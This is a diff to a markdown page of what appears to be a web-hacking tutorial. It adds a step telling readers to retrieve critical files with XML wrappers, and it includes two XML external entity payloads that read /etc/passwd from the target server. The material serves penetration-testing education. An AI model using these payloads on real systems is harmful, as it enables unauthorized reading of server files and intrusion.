@@ -19,8 +19,13 @@ We have to check if we can also send the outup using the next method:<br />
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/f557d264-8ae4-4d03-b479-8f2fcaf13f52" width="800">
 
 
-If the last command was useful we can now try to report some critical files using some Wrappers.<br />
-
+If the last command was useful we can now try to report critical files using Wrappers.<br />
+```xml
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+```
+```xml
+<!ENTITY file SYSTEM "file:///etc/passwd">
+```
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/eac5fa56-da99-429f-9d50-4168c56bac44" width="800">
 
 
